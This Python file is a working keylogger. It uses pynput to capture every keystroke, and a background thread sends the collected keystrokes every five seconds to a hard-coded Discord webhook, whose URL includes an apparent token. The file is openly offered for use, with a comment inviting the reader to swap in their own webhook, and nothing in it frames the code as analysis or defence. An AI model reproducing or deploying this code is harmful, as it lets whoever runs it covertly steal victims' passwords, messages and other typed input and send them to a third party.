from pynput import keyboard
import requests
import threading
import time

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'

# Store the keystrokes
keystrokes = ""

# Dictionary for special keys
special_keys = {
    keyboard.Key.space: "SPACE",
    keyboard.Key.enter: "ENTER",
    keyboard.Key.backspace: "BACKSPACE",
    keyboard.Key.tab: "TAB",
    keyboard.Key.shift: "SHIFT",
    keyboard.Key.ctrl_l: "CTRL",
    keyboard.Key.alt_l: "ALT",
    keyboard.Key.cmd: "CMD",
    keyboard.Key.esc: "ESC",
}

# Lock for thread-safe access to keystrokes
keystroke_lock = threading.Lock()

def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {"content": message}
    try:
        requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Error sending message to webhook: {e}")

def post_keystrokes():
    """Send accumulated keystrokes at regular intervals."""
    global keystrokes
    while True:
        time.sleep(5)  # Adjust this interval as needed (in seconds)
        if keystrokes:
            with keystroke_lock:
                send_to_webhook(keystrokes)
                keystrokes = ""  # Clear the keystrokes after sending

def on_press(key):
    global keystrokes
    try:
        # For normal characters, we just append the character with a new line
        key_str = key.char + "\n"
    except AttributeError:
        # For special keys, we use the dictionary to map to a human-readable name
        key_str = special_keys.get(key, str(key)) + "\n"  # Add new line after special keys as well

    # Append the key press to the keystrokes string
    with keystroke_lock:
        keystrokes += key_str

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener when the Esc key is pressed
        return False

# Start the background thread for posting keystrokes
keystrokes_thread = threading.Thread(target=post_keystrokes, daemon=True)
keystrokes_thread.start()

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
